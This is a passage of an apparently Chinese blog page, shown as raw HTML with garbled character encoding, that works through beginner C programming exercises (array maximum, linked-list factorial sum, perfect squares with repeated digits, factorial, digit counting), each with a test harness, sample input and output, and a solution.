class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> ElementType;</span><br><span class="line"></span><br><span class="line"><span class="function">ElementType <span class="title">Max</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ElementType S[MAXN];</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%f"</span>, &amp;S[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>, Max(S, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">è¾“å‡º</span><br><span class="line">34.00</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”-3"><a href="#è§£ç­”-3" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Max</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    ElementType <span class="built_in">max</span> = S[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">max</span> &lt; S[i]) &#123;</span><br><span class="line">            <span class="built_in">max</span> = S[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-6-æ±‚å•é“¾è¡¨ç»“ç‚¹çš„é˜¶ä¹˜å’Œ-15åˆ†"><a href="#6-6-æ±‚å•é“¾è¡¨ç»“ç‚¹çš„é˜¶ä¹˜å’Œ-15åˆ†" class="headerlink" title="6-6 æ±‚å•é“¾è¡¨ç»“ç‚¹çš„é˜¶ä¹˜å’Œ (15åˆ†)"></a>6-6 æ±‚å•é“¾è¡¨ç»“ç‚¹çš„é˜¶ä¹˜å’Œ (15åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚ <code>å•é“¾è¡¨L</code> ç»“ç‚¹çš„é˜¶ä¹˜å’Œã€‚è¿™é‡Œé»˜è®¤æ‰€æœ‰ç»“ç‚¹çš„å€¼éè´Ÿï¼Œä¸”é¢˜ç›®ä¿è¯ç»“æœåœ¨ <code>int</code> èŒƒå›´å†…ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FactorialSum</span><span class="params">( List L )</span></span>;</span><br></pre></td></tr></table></figure></div><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-5"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-5" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PtrToNode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> Data; <span class="comment">/* å­˜å‚¨ç»“ç‚¹æ•°æ® */</span></span><br><span class="line">    PtrToNode Next; <span class="comment">/* æŒ‡å‘ä¸‹ä¸€ä¸ªç»“ç‚¹çš„æŒ‡é’ˆ */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> PtrToNode List; <span class="comment">/* å®šä¹‰å•é“¾è¡¨ç±»å‹ */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FactorialSum</span><span class="params">( List L )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line">    List L, p;</span><br><span class="line">    <span class="comment">// å®šä¹‰2ä¸ªé“¾è¡¨</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    L = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// èµ‹åˆå€¼ä¸º Null</span></span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ ) &#123;</span><br><span class="line">        p = (List)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct Node));</span><br><span class="line">        <span class="comment">// ç”³è¯·nodeå˜é‡å¯¹åº”å¤§å°çš„å†…å­˜</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;p-&gt;Data);</span><br><span class="line">        p-&gt;Next = L;  L = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, FactorialSum(L));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">3</span><br><span class="line">5 3 6</span><br><span class="line">è¾“å‡º</span><br><span class="line">846</span><br><span class="line"></span><br><span class="line">é˜¶ä¹˜ 5!+3!+6!</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”-4"><a href="#è§£ç­”-4" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FactorialSum</span><span class="params">( List L )</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sum = <span class="number">0</span>, i;</span><br><span class="line">  List p = L;</span><br><span class="line">  <span class="comment">// L èµ‹å€¼ç»™ p, p å˜æˆ null, Lä¸å˜</span></span><br><span class="line">  <span class="keyword">while</span>(p) &#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt;= p-&gt;Data; i++)&#123;</span><br><span class="line">      n *= i; <span class="comment">// n = n*i </span></span><br><span class="line">    &#125;</span><br><span class="line">    sum += n;</span><br><span class="line">    p = p-&gt;Next;</span><br><span class="line">    <span class="comment">// p-&gt;next èµ‹å€¼ç»™ p</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-7-ç»Ÿè®¡æŸç±»å®Œå…¨å¹³æ–¹æ•°-20åˆ†"><a href="#6-7-ç»Ÿè®¡æŸç±»å®Œå…¨å¹³æ–¹æ•°-20åˆ†" class="headerlink" title="6-7 ç»Ÿè®¡æŸç±»å®Œå…¨å¹³æ–¹æ•° (20åˆ†)"></a>6-7 ç»Ÿè®¡æŸç±»å®Œå…¨å¹³æ–¹æ•° (20åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œåˆ¤æ–­ä»»ä¸€ç»™å®šæ•´æ•°Næ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼šå®ƒæ˜¯å®Œå…¨å¹³æ–¹æ•°ï¼Œåˆè‡³å°‘æœ‰ä¸¤ä½æ•°å­—ç›¸åŒï¼Œå¦‚144ã€676ç­‰ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsTheNumber</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ <code>N</code> æ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°ã€‚å¦‚æœ <code>N</code> æ»¡è¶³æ¡ä»¶ï¼Œåˆ™è¯¥å‡½æ•°å¿…é¡»è¿”å›1ï¼Œå¦åˆ™è¿”å›0ã€‚</p><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-6"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-6" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsTheNumber</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n1, n2, i, cnt;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n1, &amp;n2);</span><br><span class="line">    cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=n1; i&lt;=n2; i++ ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( IsTheNumber(i) )</span><br><span class="line">            cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cnt = %d\n"</span>, cnt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">105 500</span><br><span class="line">è¾“å‡º</span><br><span class="line">cnt &#x3D; 6</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”-5"><a href="#è§£ç­”-5" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsTheNumber</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a, temp[<span class="number">500</span>], count=<span class="number">0</span>, i, n=N;</span><br><span class="line">    <span class="keyword">if</span> (N&lt;=<span class="number">0</span>) &#123; <span class="comment">// è¾“å…¥å€¼ä¸ºè´Ÿæ•°</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    a = (<span class="keyword">int</span>)<span class="built_in">sqrt</span>(N); <span class="comment">// å¼€æ ¹å·</span></span><br><span class="line">    <span class="comment">// å¼ºåˆ¶è½¬æ¢æ•´å‹</span></span><br><span class="line">    <span class="keyword">if</span> (a*a==N) &#123; </span><br><span class="line">    <span class="comment">// åˆ¤æ–­æ˜¯å¦ä¸ºå®Œå…¨å¹³æ–¹æ•°</span></span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            temp[count] = n%<span class="number">10</span>; <span class="comment">// å–ä¸ªä½</span></span><br><span class="line">            n = n/<span class="number">10</span>; <span class="comment">// å–æ˜¯ç™¾åä½</span></span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;count; i++) &#123; </span><br><span class="line">                <span class="keyword">if</span> (temp[count] == temp[i]) &#123;</span><br><span class="line">                <span class="comment">// å­˜åœ¨ä¸ä¹‹å‰å–å‡ºçš„æ•°å­—ç›¸åŒçš„è¿”å›ä¸º 1</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            count += <span class="number">1</span>; <span class="comment">// count = count + 1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-8-ç®€å•é˜¶ä¹˜è®¡ç®—-10åˆ†"><a href="#6-8-ç®€å•é˜¶ä¹˜è®¡ç®—-10åˆ†" class="headerlink" title="6-8 ç®€å•é˜¶ä¹˜è®¡ç®— (10åˆ†)"></a>6-8 ç®€å•é˜¶ä¹˜è®¡ç®— (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªè®¡ç®—éè´Ÿæ•´æ•°é˜¶ä¹˜çš„ç®€å•å‡½æ•°ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Factorial</span><span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ <code>N</code> æ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°ï¼Œå…¶å€¼ä¸è¶…è¿‡12ã€‚å¦‚æœ <code>N</code> æ˜¯éè´Ÿæ•´æ•°ï¼Œåˆ™è¯¥å‡½æ•°å¿…é¡»è¿”å›Nçš„é˜¶ä¹˜ï¼Œå¦åˆ™è¿”å›0ã€‚</p><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-7"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-7" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Factorial</span><span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, NF;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    NF = Factorial(N); </span><br><span class="line">    <span class="comment">// é˜¶ä¹˜å‡½æ•° Factorial(5) = 5!</span></span><br><span class="line">    <span class="keyword">if</span> (NF)  <span class="built_in">printf</span>(<span class="string">"%d! = %d\n"</span>, N, NF);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"Invalid input\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">5</span><br><span class="line">è¾“å‡º</span><br><span class="line">5! &#x3D; 120</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”-6"><a href="#è§£ç­”-6" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Factorial</span><span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, sum=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (N&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (N&gt;<span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">        sum *= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-9-ç»Ÿè®¡ä¸ªä½æ•°å­—-15åˆ†"><a href="#6-9-ç»Ÿè®¡ä¸ªä½æ•°å­—-15åˆ†" class="headerlink" title="6-9 ç»Ÿè®¡ä¸ªä½æ•°å­— (15åˆ†)"></a>6-9 ç»Ÿè®¡ä¸ªä½æ•°å­— (15åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œå¯ç»Ÿè®¡ä»»ä¸€æ•´æ•°ä¸­æŸä¸ªä½æ•°å‡ºç°çš„æ¬¡æ•°ã€‚ä¾‹å¦‚-21252ä¸­ï¼Œ2å‡ºç°äº†3æ¬¡ï¼Œåˆ™è¯¥å‡½æ•°åº”è¯¥è¿”å›3ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Count_Digit</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N, <span class="keyword">const</span> <span class="keyword">int</span> D )</span></span>;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ <code>N</code> å’Œ <code>D</code> éƒ½æ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°ã€‚ <code>N</code> çš„å€¼ä¸è¶…è¿‡intçš„èŒƒå›´ï¼›<code>D</code>æ˜¯[0, 9]åŒºé—´å†…çš„ä¸ªä½æ•°ã€‚å‡½æ•°é¡»è¿”å›Nä¸­Då‡ºç°çš„æ¬¡æ•°ã€‚</p><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-8"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-8" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Count_Digit</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N, <span class="keyword">const</span> <span class="keyword">int</span> D )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, D;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;N, &amp;D);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, Count_Digit(N, D));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">-21252 2</span><br><span class="line">è¾“å‡º</span><br><span class="line">3</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”-7"><a href="#è§£ç­”-7" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Count_Digit</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N, <span class="keyword">const</span> <span class="keyword">int</span> D )</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M=N,cnt=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( N==<span class="number">0</span> &amp;&amp; D==<span class="number">0</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( N&lt;<span class="number">0</span> ) &#123;</span><br><span 